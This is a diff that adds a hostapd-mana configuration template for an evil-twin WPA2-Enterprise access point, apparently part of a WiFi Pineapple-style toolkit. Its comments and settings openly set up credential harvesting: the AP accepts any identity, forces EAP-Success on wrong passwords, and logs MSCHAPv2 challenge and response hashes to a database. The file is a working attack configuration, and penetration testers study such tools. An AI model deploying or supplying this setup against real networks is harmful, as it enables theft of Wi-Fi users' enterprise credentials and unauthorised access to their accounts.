@@ -1,0 +1,51 @@
+# hostapd (mana) config -- PineAPE ENTERPRISE evil-twin (WPA2-EAP), rendered by
+# compat/wifi-apply. @@VAR@@ tokens come from the UCI store (wireless.@wifi-iface[2]).
+#
+# This reproduces the original Pineapple's Enterprise VAP (wlan0-2 upstream). It
+# is a WPA2-Enterprise AP whose EAP server is hostapd itself (no external
+# RADIUS), configured to ACCEPT ANY credential and HARVEST it:
+#   - eap_user file "accepts" every identity and offers PEAP/TTLS/TLS/FAST, with
+#     a wildcard phase-2 user that accepts MSCHAPV2/GTC/MD5/PAP/CHAP (RE of
+#     /etc/pineape/hostapd-pineape.eap_user).
+#   - mana_wpe=1 logs the MSCHAPv2 username/challenge/response (NetNTLM) exactly
+#     like hostapd-wpe; net/pineape-creds-import then writes them into
+#     /etc/pineapple/pineape.db (chalresp/basic) for the panel.
+#   - mana_eapsuccess=1 forces EAP-Success so the client "connects" even with a
+#     wrong/any password (the original PINEAPE_AUTH_PASSTHROUGH behaviour).
+#
+# Rendered as a SECOND BSS on the same wlan1 radio (a VAP), driven from the
+# karma hostapd via bss=... so one hostapd instance serves open + enterprise.
+
+bss=@@ENT_IFACE@@
+ctrl_interface=/var/run/hostapd
+ssid=@@ENT_SSID@@
+@@ENT_BSSID_LINE@@
+
+# WPA2-Enterprise (802.1X)
+wpa=2
+wpa_key_mgmt=WPA-EAP
+wpa_pairwise=CCMP
+rsn_pairwise=CCMP
+ieee8021x=1
+
+# Integrated EAP server (the AP terminates EAP; no backend RADIUS).
+# server.key is generated with `-nodes` (unencrypted) by bootstrap.sh, so no
+# private_key_passwd is needed. server.crt is the CA-signed server certificate;
+# ca.pem is the CA that signs it (the client must NOT already trust it -> that is
+# exactly what makes the evil twin work against misconfigured supplicants).
+eap_server=1
+eap_user_file=/etc/pineape/hostapd-pineape.eap_user
+ca_cert=/etc/pineape/certs/ca.pem
+server_cert=/etc/pineape/certs/server.crt
+private_key=/etc/pineape/certs/server.key
+dh_file=/etc/pineape/certs/dh
+fragment_size=1400
+
+# ------------------------------------------------------------- MANA/WPE harvest
+# mana_wpe=1       : emit MSCHAPv2 creds (NetNTLM) via the WPE callback.
+# mana_eapsuccess  : accept-any-credential (the PineAPE auth passthrough). This
+#                    is toggled at runtime by the compat/hostapd_cli wrapper
+#                    (pineape_auth_passthrough_on -> EAPSUCCESS_ENABLE).
+enable_mana=1
+mana_wpe=1
+mana_eapsuccess=@@PASSTHROUGH@@
